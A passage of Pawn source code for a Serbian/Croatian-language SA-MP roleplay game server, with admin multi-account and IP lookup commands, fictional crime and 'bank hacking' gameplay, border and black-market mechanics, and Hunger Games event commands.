					SendClientMessage(i,CRVENA,string2);
					SendIP = 0;
				}
		  	}
		}
	}
}

stock aliasLogin( playerid ) {

	new string55[256];
    new playername22[ MAX_PLAYER_NAME ] ;
	GetPlayerName(playerid, playername22, sizeof(playername22));
	new playersip[64];
	GetPlayerIp(playerid,playersip,sizeof(playersip));
    if(strlen(dini_Get("Multiacc/alias.txt", playersip)) == 0)
	{
	   	dini_Set("Multiacc/alias.txt", playersip, playername22);
	}
	else
	{
		if( strfind( dini_Get("Multiacc/alias.txt", playersip), playername22, true) == -1 )
		{
			format(string55,sizeof(string55),"%s, %s", dini_Get("Multiacc/alias.txt",playersip), playername22);
			dini_Set("Multiacc/alias.txt", playersip, string55);
		}
	}
}

CMD:multiacc( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || IsPlayerAdmin( playerid ) ) {
	
		new player1;
		if(sscanf(params, "u", player1)) return SendUsageMessage(playerid, "/multiacc [ ID/Deo Imena ]");

		new playername[ MAX_PLAYER_NAME ], str[ 128 ], tmp3[ 50 ];

		if( IsPlayerConnected( player1 ) && player1 != INVALID_PLAYER_ID ) {
		
			GetPlayerIp( player1, tmp3, 50 );
			GetPlayerName(player1, playername, sizeof(playername));

			format(str, sizeof(str), ""col_white"Drugi korisnicki racuni za ime "col_crvena"%s (%d)"col_white" su:\n\t%s", playername, player1, dini_Get("Multiacc/alias.txt",tmp3) );

			return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, ""col_white"PROVERA "col_crvena"MULTI RACUNA", str, "Zatvori", "");
		}
		else return SendErrorMessage(playerid, "Pogresan ID" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
}

CMD:ips( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || IsPlayerAdmin( playerid ) ) {
	
		new ID;
		if( sscanf( params, "u", ID ) ) return SendUsageMessage(playerid, "/ips [ ID/Deo Imena ]");

		new playername[ MAX_PLAYER_NAME ], str[ 128 ];

		if( IsPlayerConnected( ID ) && ID != INVALID_PLAYER_ID ) {
		
			GetPlayerName(ID, playername, sizeof(playername));

			format(str, sizeof(str), ""col_white"IP-ovi koristeni na "col_crvena"%s (%d)"col_white" su:\n\t%s", playername, ID, dini_Get("Multiacc/ips.txt",playername) );

			return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, ""col_white"PROVERA "col_crvena"MULTI RACUNA", str, "Zatvori", "");
		}
		else return SendErrorMessage(playerid, "Pogresan ID" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
}

CMD:offips( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] <= 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new name2[24],msg[356];
 	if(sscanf(params, "s[24]", name2))
		return SendUsageMessage(playerid, "/offips [ Ime_Prezime ]");

    format(ipFILE, 64, "Multiacc/%s.txt", name2);

    if(!dini_Exists(ipFILE))
        return SendErrorMessage(playerid, "Odabrano ime ne postoji na ovom serveru - provjerite sva slova.");

	format(msg, sizeof(msg), ""col_white"IP-ovi koristeni na imenu "col_crvena"%s"col_white" su:\n\t%s", name2, dini_Get("Multiacc/alias.txt",name2) );

	return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, ""col_white"PROVERA "col_crvena"MULTI RACUNA", msg, "Zatvori", "");

}

CMD:offmultiacc( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] <= 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new tmp3[50], msg[356], name[24];
 	if(sscanf(params, "s[24]", name))
		return SendUsageMessage(playerid, "/offmultiacc [ Ime_Prezime ]");

    format(ipFILE, 64, "Multiacc/%s.txt", name);

    if(!dini_Exists(ipFILE))
        return SendErrorMessage(playerid, "Odabrano ime ne postoji na ovom serveru - provjerite sva slova.");

	strmid(tmp3,dini_Get(ipFILE, "Nameip"),0,50,50);

	format(msg, sizeof(msg), ""col_white"Drugi korisnicki racuni za ime "col_crvena"%s"col_white" su:\n\t%s", name, dini_Get("Multiacc/alias.txt",tmp3) );

	return ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, ""col_white"PROVERA "col_crvena"MULTI RACUNA", msg, "Zatvori", "");
}
////////////////////////////////////////////////////////////
// V01D komande za pisanje po sirotinji ( razmisljam da se ubijem, depresija jebiga :/ (Primjetio sam # Ceta)
////////////////////////////////////////////////////////////
CMD:izvadilicnu( playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, -809.9789,1003.4763,-56.6087)) return SendErrorMessage(playerid, "Nisi u birou za zaposljavanje!");
	if(PlayerInfo[playerid][xLicnaKarta] == 1) return SendErrorMessage(playerid, "Vec imas licnu kartu!");
	if(GetPlayerMoney(playerid) < 300) return SendErrorMessage(playerid, "Nemas dovoljno novca(300$)!");
	PlayerInfo[playerid][xLicnaKarta] = 1;
	DajIgracuNovac(playerid, -300);
	SendInfoMessage(playerid, "Uspesno si kupio licnu kartu!");

    if(PlayerInfo[playerid][xAchivements][0] == 0) {

        achivementPassed(playerid, 0, 1000);
    }

	return 1;
}
////////////////////////////////////////////////////////////
CMD:izvadipasos( playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, -809.9789,1003.4763,-56.6087)) return SendErrorMessage(playerid, "Nisi u birou za zaposljavanje!");
	if(PlayerInfo[playerid][xPasos] == 1) return SendErrorMessage(playerid, "Vec imas pasos!");
	if(GetPlayerMoney(playerid) < 300) return SendErrorMessage(playerid, "Nemas dovoljno novca(300$)!");
	PlayerInfo[playerid][xPasos] = 1;
	DajIgracuNovac(playerid, -300);
	SendInfoMessage(playerid, "Uspesno si kupio pasos!");

    if(PlayerInfo[playerid][xAchivements][0] == 0) {

        achivementPassed(playerid, 0, 1000);
    }

	return 1;
}
/////////////////////////////////////////////////////////////
CMD:dosije( playerid, params[] )  //OPTIMIZACIJA LEVEL V01D HAHAHAHAHAHHAHA JAOOOO MILAAA MAJKOOOO
{
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/dosije [ID]");
	if(PlayerInfo[id][xWanted] < 1) return SendErrorMessage(playerid, "Igrac nema wanted!");
	new posao[30];
	if(PlayerInfo[id][xPosao] == 0) { posao = "Nema"; }
    else if(PlayerInfo[id][xPosao] == 1) { posao = "Delivery"; }
	else if(PlayerInfo[id][xPosao] == 4) { posao = "Kosac"; }
	else if(PlayerInfo[id][xPosao] == 7) { posao = "Pizza"; }
	else if(PlayerInfo[id][xPosao] == 11) { posao = "Rudar"; }
	else if(PlayerInfo[id][xPosao] == 13) { posao = "Diler Droge"; }
	else if(PlayerInfo[id][xPosao] == 14) { posao = "Bolnicar"; }
	else if(PlayerInfo[id][xPosao] == 15) { posao = "Vojnik"; }
	else if(PlayerInfo[id][xPosao] == 16) { posao = "Sabotazer"; }
	else if(PlayerInfo[id][xPosao] == 17) { posao = "Advokat"; }
	new drzava[15];
	if(PlayerInfo[id][xDrzava] == 1) { drzava = "Makedonija"; }
	else if(PlayerInfo[id][xDrzava] == 2) { drzava = "Hrvatska"; }
	else if(PlayerInfo[id][xDrzava] == 3) { drzava = "Srbija"; }
	else if(PlayerInfo[id][xDrzava] == 4) { drzava = "Crna Gora"; }
	else if(PlayerInfo[id][xDrzava] == 5) { drzava = "BiH"; }
	else if(PlayerInfo[id][xDrzava] == 6) { drzava = "Ostalo"; }

	new string1[68], string2[68], string3[68], string4[68], string5[68], string6[68], string7[68], string8[68];
	format(string1, sizeof(string1), ""col_crvena"| "col_white"Ime : %s |\n", ImeIgraca(id));
	format(string2, sizeof(string2), ""col_crvena"| "col_white"Drzava : %s |\n", drzava);
	format(string3, sizeof(string3), ""col_crvena"| "col_white"Broj : %d |\n", PlayerInfo[id][xBrojTelefona]);
	format(string4, sizeof(string4), ""col_crvena"| "col_white"Posao : %s |\n", posao);
	format(string5, sizeof(string5), ""col_crvena"| "col_white"Imovina : %d |\n", PlayerInfo[id][xProperty][0]);
	format(string6, sizeof(string6), ""col_crvena"| "col_white"Imovina : %d |\n", PlayerInfo[id][xProperty][1]);
	format(string7, sizeof(string7), ""col_crvena"| "col_white"Imovina : %d |\n", PlayerInfo[id][xProperty][2]);
	format(string8, sizeof(string8), ""col_crvena"| "col_white"Firma : %d |\n", PlayerInfo[id][xFirmaID]);
	new info[2080];
    strcat(info, ""col_crvena"||===============================================[ "col_white"DOSIJE"col_crvena" ]=============================================||\n\n", sizeof(info));
    strcat(info, string1, sizeof(info));
    strcat(info, string2, sizeof(info));
    strcat(info, string3, sizeof(info));
    strcat(info, string4, sizeof(info));
    strcat(info, string5, sizeof(info));
    strcat(info, string6, sizeof(info));
    strcat(info, string7, sizeof(info));
    strcat(info, string8, sizeof(info));
    strcat(info, ""col_crvena"||========================================================================================================||\n\n", sizeof(info));
    SPD(playerid, DIALOG_DOSIJE, DIALOG_STYLE_MSGBOX, ""col_crvena"DOSIJE", info, "Uredu", "");
	return 1;
}
////////////////////////////////////////////////////////////
CMD:granica(playerid, params[])
{
	if(PlayerInfo[playerid][xLicnaKarta] == 0 && PlayerInfo[playerid][xPasos] == 0) return SendErrorMessage(playerid, "Nemate licnu kartu i pasos!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Niste na mestu vozaca!");
	if(PlayerInfo[playerid][xWanted] >= 1 && PlayerInfo[playerid][xLaznaLicna] == 0 && PlayerInfo[playerid][xLazniPasos] == 0)
	{
		SendErrorMessage(playerid, "Trazen si!Ne mozes preci granicu bez laznog pasosa i lazne licne!");
		new string[128];
		format( string, sizeof( string ), "* Granicni Policajac je identifikovao kriminalca %s.", ImeIgraca( playerid ) );
		SetPlayerColor(playerid, 0xAA333300);

		foreach( Player, i ) {
			if( IsPlayerConnected( i ) ) {
				if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
					SCM( i, 0x8D8DFF00, string );
				}
			}
		}
		return 1;
	}
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 3732.6487,-974.5557,11.1350)) //ULAZ FLORIDA
    {

        if(GetPlayerMoney(playerid) < 50) return SendErrorMessage(playerid, "Nemas dovoljno novca(50$)");
        floridaGranica1Podigni();
        SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));
        DajIgracuNovac(playerid, -50);
        return 1;
    }
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 3721.5398,-972.7080,11.1350)) //IZLAZ FLORIDA
    {

        if(GetPlayerMoney(playerid) < 50) return SendErrorMessage(playerid, "Nemas dovoljno novca(50$)");
        floridaGranica2Podigni();
        SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));
        DajIgracuNovac(playerid, -50);
        return 1;
    }
	else if(IsPlayerInRangeOfPoint(playerid, 3.0, 1803.1553,783.5743,11.5500)) //ULAZ Las Venturas
	{

        if(TrenutniKokain[playerid] > 0) {

            new sansa = RandomNew(1,3);

            if(sansa == 2) {

                new string[128];
                new cena = TrenutniKokain[playerid] * 100;
                format(string, sizeof(string), "Carinik vas je uhvatio! Da li zelite da platite %d$ da prodjete?", cena);
                ShowPlayerDialog(playerid, dialog_GranicaPretres, DIALOG_STYLE_MSGBOX, "Granica Pretres", string, "Plati", "Odustani");

                return 1;
            }
        }

		if(GetPlayerMoney(playerid) < 50) return SendErrorMessage(playerid, "Nemas dovoljno novca(50$)");
		MoveObject(granicabgsaulaz, 1799.7670, 785.5780, 11.5160, 3.0, 0.0000, -33.0000, -178.0000);
		defer GranicaTimer1();
		SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));
		DajIgracuNovac(playerid, -50);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 3.0, 1789.0673,788.2881,11.4231)) //IZLAZ Las Venturas
	{

        if(TrenutniKokain[playerid] > 0) {

            new sansa = RandomNew(1,3);

            if(sansa == 2) {

                new string[128];
                new cena = TrenutniKokain[playerid] * 100;
                format(string, sizeof(string), "Carinik vas je uhvatio! Da li zelite da platite %d$ da prodjete?", cena);
                ShowPlayerDialog(playerid, dialog_GranicaPretres, DIALOG_STYLE_MSGBOX, "Granica Pretres", string, "Plati", "Odustani");

                return 1;
            }
        }

		if(GetPlayerMoney(playerid) < 50) return SendErrorMessage(playerid, "Nemas dovoljno novca(50$)");
		MoveObject(granicabgsaizlaz, 1792.7410, 785.8330, 11.2110, 3.0, 0.0000, -33.0000, -4.0000);
		defer GranicaTimer2();
		SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));
		DajIgracuNovac(playerid, -50);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 3.0, 58.7950,-1525.6416,4.9652)) //IZLAZ IZ Los SantosA
	{

        if(TrenutniKokain[playerid] > 0) {

            new sansa = RandomNew(1,3);

            if(sansa == 2) {

                new string[128];
                new cena = TrenutniKokain[playerid] * 100;
                format(string, sizeof(string), "Carinik vas je uhvatio! Da li zelite da platite %d$ da prodjete?", cena);
                ShowPlayerDialog(playerid, dialog_GranicaPretres, DIALOG_STYLE_MSGBOX, "Granica Pretres", string, "Plati", "Odustani");

                return 1;
            }
        }

		if(GetPlayerMoney(playerid) < 50) return SendErrorMessage(playerid, "Nemas dovoljno novca(50$)");
		MoveObject(granicabgzgulaz, 56.1060, -1529.3879, 5.0650, 3.0, 0.0000, -25.0000, -97.0000);
		defer GranicaTimer3();
		SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));
		DajIgracuNovac(playerid, -50);
		return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 3.0, 44.0856,-1537.7295,5.1893)) //ULAZ U BG
	{

        if(TrenutniKokain[playerid] > 0) {

            new sansa = RandomNew(1,3);

            if(sansa == 2) {

                new string[128];
                new cena = TrenutniKokain[playerid] * 100;
                format(string, sizeof(string), "Carinik vas je uhvatio! Da li zelite da platite %d$ da prodjete?", cena);
                ShowPlayerDialog(playerid, dialog_GranicaPretres, DIALOG_STYLE_MSGBOX, "Granica Pretres", string, "Plati", "Odustani");

                return 1;
            }
        }

		if(GetPlayerMoney(playerid) < 50) return SendErrorMessage(playerid, "Nemas dovoljno novca(50$)");
		MoveObject(granicabgzgizlaz, 47.1280, -1533.8110, 5.0650, 3.0, 4.0000, -25.0000, 83.0000);
		defer GranicaTimer4();
		SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));
		DajIgracuNovac(playerid, -50);
		return 1;
	}
	return 1;
}
////////////////////////////////////////////////////////////
CMD:blackmarket(playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, 525.3239,-2563.0830,4.2118)) return SendErrorMessage(playerid, "Nisi blizu Black Marketa!");
	// if( GetFactionType( playerid ) == ORG_TIP_PD ) {
	// 	SendErrorMessage( playerid, "PD/FBI/CIA nema razloga koristiti ovo!");
	// 	return 1;
	// }
	ShowPlayerDialog(playerid, DIALOG_DILER, DIALOG_STYLE_LIST, "Black Market", "Laptop(12.000$)\nDinamit(15.000$)\nLazna Licna(150.000$)\nLazni Pasos(150.000$)\nBitCoin Masina\nKokain Torba(15.000$)\nJednokratni Srafciger(3.000$)", D_ODABERI, D_ODUSTANI);
	return 1;
}
////////////////////////////////////////////////////////////
CMD:robmarket( playerid, params[] ) {

    new businessId = GetPlayerBusinessId( playerid, VRSTA_MARKET );

	if( businessId == -1 ) {
		SendErrorMessage( playerid, "Morate biti kod kase u marketu da bi koristili ovu komandu." );
	} else {
	
	    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -28.0849,-89.9528,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do kase za naplacivanje." );
	    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
		SendErrorMessage( playerid, "PD/FBI/CIA nema razloga koristiti ovo!");
		return 1;
		}
        if(PlayerInfo[playerid][xRobanjeMarketa] != 0) return SendErrorMessage(playerid, "Sacekaj malo!");
		if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");
		if( GetPlayerWeapon(playerid) == 0) return SendErrorMessage(playerid, "Morate imati oruzije kod sebe!");
		TimerRobMarket = defer RobMarket(playerid);
		RobMarketKurac{playerid} = RobMarketTime;
		SendInfoMessage(playerid, "Zapoceli ste pljackanje marketa!Ako izadjete pljacka ce se prekinuti!");
	}
	return 1;
}
////////////////////////////////////////////////////////////
CMD:hakovanjebanke(playerid, params[])
{
    if(IsPlayerInDynamicArea(playerid, bankaHackingZona)) {
		if( GetFactionType( playerid ) == ORG_TIP_PD ) {
			SendErrorMessage( playerid, "PD/FBI/CIA nema razloga koristiti ovo!");
			return 1;
		}
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
		if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");
		if(PlayerInfo[playerid][xLaptop] == 0) return SendErrorMessage(playerid, "Nemas laptop! Kupi ga na crnom trzistu!");
		HakovanjeBankaTimer = defer HackBank(playerid);
		SendInfoMessage(playerid, "Zapoceo si hakovanje banke! Ostani u krugu banke!");
		BankHackOdbrojavanje[playerid] = BankaHackTime;
		PlayerInfo[playerid][xLaptop] = 0;
		HakujeBratina[playerid] = 1;

        foreach(Player, i) {

            if(GetFactionType(playerid) == ORG_TIP_PD) {

                SendClientMessage(playerid, -1, ""col_crvena"[BANKA HAKOVANJE]"col_white"Neko pokusava da hakuje banku!");
            }
        }

		return 1;
	}
    else return SendErrorMessage(playerid, "Nisi u krugu banke!"); 
}

////////////////////////////////////////////////////////////
timer HackBank[1000](playerid)
{
    if(IsPlayerInDynamicArea(playerid, bankaHackingZona)) {
		if(BankHackOdbrojavanje[playerid] != 0)
		{
			va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, BankHackOdbrojavanje[playerid]);
			BankHackOdbrojavanje[playerid]--;
			defer HackBank(playerid);
		}
		else
	    {
	        BankHackOdbrojavanje[playerid] = 0;
	        SendInfoMessage(playerid, "Uspesno si hakovao banku i dobio %d$ prljavog novca!", BankaHackPrice);
			DajPrljavNovac(playerid, BankaHackPrice);
			HakujeBratina[playerid] = 0;
			PostaviWanted(playerid, "Hakovanje Banke", "Nepoznat", 10);
	    }
	}
	else
	{
		BankHackOdbrojavanje[playerid] = 0;
		SendInfoMessage(playerid, "Izasao si iz kruga banke!");
		stop HakovanjeBankaTimer;
		HakujeBratina[playerid] = 0;
		PostaviWanted(playerid, "Pokusaj Hakovanja Banke", "Nepoznat", 5);
	}
	return 1;
}
////////////////
timer GranicaTimer1[7000]()
{
	MoveObject(granicabgsaulaz, 1799.76697, 785.57800, 11.51600,3.0, 0.00000, -90.00000, -178.00000);
	return 1;
}
/////////////////////////////////////////////////////////////////////////////////////////
timer GranicaTimer2[7000]()
{
	MoveObject(granicabgsaizlaz, 1792.74097, 785.83301, 11.21100,3.0, 0.00000, -90.00000, -3.92000);
	return 1;
}
/////////////////////////////////////////////////////////////////////////////////////////
timer GranicaTimer3[7000]()
{
	MoveObject(granicabgzgulaz, 56.10600, -1529.38794, 5.06500,3.0, 0.00000, -90.00000, -97.00000);
	return 1;
}
/////////////////////////////////////////////////////////////////////////////////////////
timer GranicaTimer4[7000]()
{
	MoveObject(granicabgzgizlaz, 47.12800, -1533.81104, 5.06500,3.0, 4.00000, -91.00000, 83.00000);
	return 1;
}

timer CementUtovar[10000](playerid)
{
	UtovarCementa[playerid] = 0;
	TogglePlayerControllable(playerid, 1);
	DostavljaCement[playerid] = 1;
	SendJobMessage( playerid, "Utovarili ste cement, istovarite ga na markeru!" );
	CheckpointStatus[playerid] = 36;
	Novi_SetPlayerCheckpoint(playerid, 2467.4778, 1916.6461, 9.7656, 8.0);
	return 1;
}

timer CementIstovar[10000](playerid)
{
	DostavljaCement[playerid] = 0;
	SendJobMessage( playerid, "Istovarili ste cement, vratite se u Los Santos da bi primili platu!" );
	TogglePlayerControllable(playerid, 1);
	Novi_SetPlayerCheckpoint(playerid, 2322.7451,-1992.6045,13.5522, 8.0); 
	CheckpointStatus[ playerid ] = 37;
	return 1;
}

task VremeDatum[1000]()
{

	new dan, godina, mesec;
	getdate(godina, mesec, dan);
	new sati,minuti,sekunde;
	gettime(sati, minuti, sekunde);
	new stringic[16];
    format(stringic, sizeof stringic, "%d/%s%d/%s%d", dan, ((mesec < 10) ? ("0") : ("")), mesec, (godina < 10) ? ("0") : (""), godina);
	TextDrawSetString(InGame_TD[12], stringic);
    format(stringic, sizeof stringic, "%s%d:%s%d:%s%d", (sati < 10) ? ("0") : (""), sati, (minuti < 10) ? ("0") : (""), minuti, (sekunde < 10) ? ("0") : (""), sekunde);
	TextDrawSetString(InGame_TD[13], stringic);
	return 1;
}

AntiDeAMX()
{
	new a[][] =
	{
	    "Unarmed (Fist)",
	    "Brass K"
	};
	#pragma unused a
}

//========================= [ KOMANDE ZA HUNGER GAMES BY V01D ] ================================//

CMD:megakutija(playerid, params[])
{
	if(HungerGame{playerid} == false) return HungerMessage(playerid, "Nisi u Igrama Gladi!");
	if(OtvorioMegaKutiju{playerid} == 1) return HungerMessage(playerid, "Vec si otvorio Mega Kutiju!");
	if(IsPlayerInRangeOfPoint(playerid, 3.0, 470.02332, 7422.81494, 1.45670) ||
		IsPlayerInRangeOfPoint(playerid, 3.0, 473.14664, 7407.60352, 1.45670) ||
		IsPlayerInRangeOfPoint(playerid, 3.0, 461.53339, 7397.27539, 1.45670) ||
		IsPlayerInRangeOfPoint(playerid, 3.0, 456.88779, 7394.87793, 1.49604))
	{
		HungerMessage(playerid, "Otvorio si Mega Kutiju!");
		GiveWeaponToPlayer(playerid, 24, 10);
		GiveWeaponToPlayer(playerid, 31, 30);
		Novi_SetPlayerArmour(playerid, 30.0);
		OtvorioMegaKutiju{playerid} = 1;
		return 1;
	}
	return 1;
}

CMD:hgcount(playerid, params[])
{
    if(!isClanAdministracije(playerid)) return HungerMessage(playerid, "Samo admini i helperi!");
	if(HungerPokrenut == 0) return HungerMessage(playerid, "Hunger Games nije pokrenut!");
	if(HungerPokrenut < 3) return HungerMessage(playerid, "Nema dovoljno igraca!");
	HungerJosMaloPocinje = true;
	foreach(new hunger : HungerGamesIgraci)
	{
		HungerMessage(hunger, "Igra pocinje za 5 sekundi!");
		SetTimer("hgcount4",1000,0);
		SetTimer("hgcount3",2000,0);
		SetTimer("hgcount2",3000,0);
		SetTimer("hgcount1",4000,0);
		SetTimer("hgcountgo",5000,0);
	}
	return 1;
}

CMD:pokrenihungergames(playerid, params[]) //Pokretanje igre koje moze samo RCON!
{
	if(!isClanAdministracije(playerid)) return HungerMessage(playerid, "Samo admini i helperi!");
	if( !AdminDuty[ playerid ] ) return HungerMessage( playerid, "Da bi koristili ovu komandu morate biti Administrator na duznosti." );
	if(HungerPokrenut >= 1) return HungerMessage(playerid, "Hunger Games je vec pokrenut!");
	va_SendClientMessageToAll(0xC34848FF, "Admin %s je pokrenuo Hunger Games! /joinhungergames", ImeIgraca(playerid));
	HungerPokrenut = 1;
	HungerJosMaloPocinje = false;
	return 1;
}

CMD:joinhungergames(playerid, params[]) //Zanemarite shit kod xD
{
	if(HungerPokrenut == 0) return HungerMessage(playerid, "Hunger Games nije pokrenut!");
	if(HungerGame{playerid} == true) return HungerMessage(playerid, "Vec si u Hunger Gamesu!");
	if(HungerJosMaloPocinje == true) return HungerMessage(playerid, "Zakasnio si!");
	if(HungerPokrenut == 20) return HungerMessage(playerid, "Slotovi su puni!");

    if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) return SendErrorMessage( playerid, "Momak, koliko znam ti si Game Helper?" );
	if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );
	if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
	if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
	if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
    

	HungerMessage(playerid, "Usao si u Hunger Games!Igra uskoro pocinje, srecno! Da napustis HG koristi /napustihg");
	HungerGame{playerid} = true;
	HungerPokrenut++;
	TogglePlayerControllable(playerid, 0);
	SetPlayerCameraPos(playerid, 533.818908, 7404.736328, 31.380273);
	SetPlayerCameraLookAt(playerid, 529.186767, 7403.687500, 29.817087, CAMERA_CUT);

	KutijaTimer{playerid} = 0;
	OtvorioMegaKutiju{playerid} = 0;

	Iter_Add(HungerGamesIgraci, playerid);
	switch(HungerPokrenut)
	{
		case 1: { SetPlayerPos(playerid, 439.3299,7362.6885,1.7694); }
		case 2: { SetPlayerPos(playerid, 454.0508,7358.1528,1.7694); }
		case 3: { SetPlayerPos(playerid, 468.7899,7358.3267,1.7694); }
		case 4: { SetPlayerPos(playerid, 482.8680,7363.0225,1.7694); }
		case 5: { SetPlayerPos(playerid, 495.5219,7370.9502,1.7694); }
		case 6: { SetPlayerPos(playerid, 504.6278,7382.9180,1.7694); }
		case 7: { SetPlayerPos(playerid, 510.1655,7396.6069,1.7694); }
		case 8: { SetPlayerPos(playerid, 511.1637,7411.7080,1.7694); }
		case 9: { SetPlayerPos(playerid, 507.6249,7426.2534,1.7694); }
		case 10: { SetPlayerPos(playerid, 500.5654,7439.3320,1.7694); }
		case 11: { SetPlayerPos(playerid, 489.2260,7449.4365,1.7694); }
		case 12: { SetPlayerPos(playerid, 475.8217,7455.9771,1.7694); }
		case 13: { SetPlayerPos(playerid, 461.1184,7458.1367,1.7694); }
		case 14: { SetPlayerPos(playerid, 445.9854,7455.7183,1.7694); }
		case 15: { SetPlayerPos(playerid, 432.5828,7449.7109,1.7694); }
		case 16: { SetPlayerPos(playerid, 421.8511,7439.3535,1.7694); }
		case 17: { SetPlayerPos(playerid, 414.0779,7426.2793,1.7694); }
		case 18: { SetPlayerPos(playerid, 411.0470,7411.5269,1.7694); }
		case 19: { SetPlayerPos(playerid, 412.4170,7396.9771,1.7694); }
	}
	new igraca = HungerPokrenut-1;
	va_SendClientMessageToAll(0xC34848FF, "(HungerGames) : {FFFFFF}Igrac %s se pridruzio Hunger Games-u! Igraca : %d!", ImeIgraca(playerid), igraca);
	return 1;
}

CMD:zaustavihg(playerid, params[])
{
	if(!isClanAdministracije(playerid)) return HungerMessage(playerid, "Samo admini i helperi!");
	if(HungerPokrenut == 0) return HungerMessage(playerid, "Hunger Games nije pokrenut!");
	HungerPokrenut = 0;
	HungerJosMaloPocinje = false;
	foreach(new hgplayers : HungerGamesIgraci)
	{
		HungerGame{hgplayers} = false;
		stop KutijaTimercic;
		KutijaTimer{hgplayers} = 0;
		OtvorioMegaKutiju{hgplayers} = 0;
		SpawnPlayer(hgplayers);
	}
	Iter_Clear(HungerGamesIgraci);
	SendClientMessageToAll(0xC34848FF, "(HungerGames) : {FFFFFF}Administrator je zaustavio Hunger Games!");
	return 1;
}

CMD:napustihg(playerid, params[])
{
	if(HungerPokrenut == 0) return HungerMessage(playerid, "Hunger Games nije pokrenut!");
	if(HungerGame{playerid} == false) return HungerMessage(playerid, "Nisi u Hunger Games-u!");
	if(HungerPokrenut == 3) return HungerMessage(playerid, "Ostao si ti i jos jedan ucesnik! Ne mozes to!");
	HungerGame{playerid} = false;
	stop KutijaTimercic;
	KutijaTimer{playerid} = 0;
	OtvorioMegaKutiju{playerid} = 0;
	HungerPokrenut--;
	SpawnPlayer(playerid);
	HungerMessage(playerid, "Napustio si HungerGames!");
	Iter_Remove(HungerGamesIgraci, playerid);
	return 1;
}

//========================= [ TIMERI ZA HUNGER ] ================================//

timer KutijaOdbrojavanje[1000](playerid)
{
	if(KutijaTimer{playerid} != 0)
	{
		new string[26];
        format(string,sizeof(string), "%d sekundi do nove kutije", KutijaTimer{playerid});
        GameTextForPlayer(playerid, string, 1000, 3);
        KutijaTimer{playerid} --;
        KutijaTimercic = defer KutijaOdbrojavanje(playerid);
	}
	else
	{
		HungerMessage(playerid, "Sada mozete otvoriti novu kutiju!");
	}
	return 1;
}

forward hgcount4();
forward hgcount3();
forward hgcount2();
forward hgcount1();
forward hgcountgo();

public hgcount4()
{
	foreach(new igraci : HungerGamesIgraci)
	{
		GameTextForPlayer(igraci, "4", 1000, 3);
	}
}

public hgcount3()
{
